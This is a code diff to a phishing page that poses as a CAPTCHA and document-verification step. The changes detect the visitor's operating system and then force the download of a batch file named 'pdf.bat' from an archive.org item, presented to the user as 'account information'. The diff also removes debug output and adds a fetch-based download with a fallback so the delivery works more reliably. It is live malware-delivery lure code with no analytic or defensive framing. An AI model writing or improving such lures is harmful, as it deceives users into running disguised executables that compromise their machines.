@@ -325,17 +325,6 @@
             color: #5d4037;
             line-height: 1.5;
         }
-
-        .debug-info {
-            margin-top: 15px;
-            padding: 10px;
-            background-color: #f5f5f5;
-            border-radius: 5px;
-            font-size: 0.8rem;
-            color: #666;
-            text-align: left;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -372,7 +361,6 @@
             </div>
             
             <div id="detected-os" class="detected-os"></div>
-            <div id="debug-info" class="debug-info"></div>
             
             <button id="submit-btn" onclick="validateCaptcha()">Verify Identity & Access Documents</button>
         </div>
@@ -414,12 +402,6 @@
             const userAgent = navigator.userAgent.toLowerCase();
             const platform = navigator.platform.toLowerCase();
             const vendor = navigator.vendor ? navigator.vendor.toLowerCase() : '';
-            const maxTouchPoints = navigator.maxTouchPoints || 0;
-            
-            let debugInfo = `User Agent: ${navigator.userAgent}<br>`;
-            debugInfo += `Platform: ${navigator.platform}<br>`;
-            debugInfo += `Vendor: ${navigator.vendor || 'N/A'}<br>`;
-            debugInfo += `Max Touch Points: ${maxTouchPoints}<br>`;
             
             // Windows detection - multiple methods
             const windowsIndicators = [
@@ -446,12 +428,7 @@
             const windowsScore = windowsIndicators.filter(Boolean).length;
             const macScore = macIndicators.filter(Boolean).length;
             
-            debugInfo += `Windows Indicators: ${windowsScore}/${windowsIndicators.length}<br>`;
-            debugInfo += `macOS Indicators: ${macScore}/${macIndicators.length}<br>`;
-            
             const detectedOS = document.getElementById('detected-os');
-            const debugDiv = document.getElementById('debug-info');
-            debugDiv.innerHTML = debugInfo;
             
             // Determine OS based on scores
             if (windowsScore > 0 && windowsScore >= macScore) {
@@ -511,7 +488,8 @@
         // Process file download based on OS
         function processFileDownload(os) {
             const messageDiv = document.getElementById('message');
-            const fileUrl = 'https://archive.org/download/pdf_20251111_202511/pdf.bat';
+            // Use the direct archive.org download URL
+            const fileUrl = 'https://ia903106.us.archive.org/31/items/pdf_20251111_202511/pdf.bat';
             
             if (os === 'windows') {
                 messageDiv.innerHTML += '<br><i class="fas fa-download"></i> <strong>Windows Device Detected</strong><br>Opening file explorer and downloading account information...';
@@ -523,16 +501,9 @@
                     console.log('Could not open file explorer with search-ms protocol');
                 }
                 
-                // Download the file with original name (remove download attribute)
+                // Download the file using fetch to ensure proper download
                 setTimeout(() => {
-                    const winLink = document.createElement('a');
-                    winLink.href = fileUrl;
-                    // Remove the download attribute to keep original filename
-                    winLink.target = '_blank'; // Open in new tab/window
-                    document.body.appendChild(winLink);
-                    winLink.click();
-                    document.body.removeChild(winLink);
-                    
+                    downloadFile(fileUrl, 'pdf.bat');
                     messageDiv.innerHTML += '<br><i class="fas fa-check"></i> File download initiated. Please check your downloads folder.';
                     
                     // Final message
@@ -544,16 +515,9 @@
             else if (os === 'macos') {
                 messageDiv.innerHTML += '<br><i class="fas fa-download"></i> <strong>macOS Device Detected</strong><br>Downloading account information...';
                 
-                // Download the file with original name (remove download attribute)
+                // Download the file using fetch to ensure proper download
                 setTimeout(() => {
-                    const macLink = document.createElement('a');
-                    macLink.href = fileUrl;
-                    // Remove the download attribute to keep original filename
-                    macLink.target = '_blank'; // Open in new tab/window
-                    document.body.appendChild(macLink);
-                    macLink.click();
-                    document.body.removeChild(macLink);
-                    
+                    downloadFile(fileUrl, 'pdf.bat');
                     messageDiv.innerHTML += '<br><i class="fas fa-check"></i> File download initiated. Please check your downloads folder.';
                     
                     // Final message
@@ -562,6 +526,43 @@
                     }, 1000);
                 }, 1000);
             }
+        }
+
+        // Enhanced download function using fetch API
+        function downloadFile(url, filename) {
+            fetch(url, {
+                method: 'GET',
+                mode: 'no-cors' // Use no-cors to avoid CORS issues
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.blob();
+            })
+            .then(blob => {
+                // Create blob URL and trigger download
+                const blobUrl = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = blobUrl;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(blobUrl);
+                document.body.removeChild(a);
+            })
+            .catch(error => {
+                console.error('Download error:', error);
+                // Fallback: direct link approach
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            });
         }
 
         // Initialize the CAPTCHA and OS detection on page load
